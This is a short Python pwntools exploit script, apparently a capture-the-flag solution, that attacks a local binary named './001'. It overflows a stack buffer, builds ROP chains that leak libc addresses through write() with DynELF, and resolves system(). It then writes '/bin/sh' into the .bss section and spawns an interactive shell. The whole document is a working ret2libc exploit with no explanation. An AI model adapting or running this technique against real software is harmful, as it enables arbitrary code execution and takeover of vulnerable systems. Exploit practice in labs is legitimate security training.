#!/usr/bin/python 
from pwn import *

p = process('./001')
lv2 = ELF('./001')

read_plt = lv2.plt['read']
write_plt = lv2.plt['write']

vul_func = lv2.functions['vulnerable_function'].address

def leak(address):
    payload1 = "A" * 140 + p32(write_plt) + p32(vul_func) + p32(1) + p32(address) + p32(4)
    p.send(payload1)
    data = p.read(4)
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=ELF('./001'))

system_addr = d.lookup('system', 'libc')
log.info("system_addr = " + hex(system_addr))

bss_addr = lv2.bss()
pppr = 0x804850d

payload2 = "B" * 140 + p32(read_plt) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(vul_func) + p32(bss_addr)

p.send(payload2)
p.send("/bin/sh\0")

p.interactive()
